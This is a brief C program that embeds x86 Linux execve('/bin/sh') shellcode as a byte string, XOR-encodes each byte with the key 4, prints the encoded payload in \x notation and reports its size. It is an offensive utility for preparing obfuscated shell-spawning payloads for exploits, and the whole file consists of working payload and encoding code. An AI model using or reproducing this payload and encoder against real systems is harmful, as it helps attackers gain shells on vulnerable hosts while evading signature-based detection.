#include <stdio.h>
#include <string.h>

char shellcode[] = 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x05\x5b\xb0\x0b\xcd\x80\xe8\xf6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void)
{
	int i;
	for(i=0;i<sizeof(shellcode);i++)
	{
		shellcode[i] ^= 4;
		printf("\\x%.2x", (shellcode[i]&0x000000ff));
	}

	printf("\n\nsize:%d bytes.\n", strlen(shellcode));
}
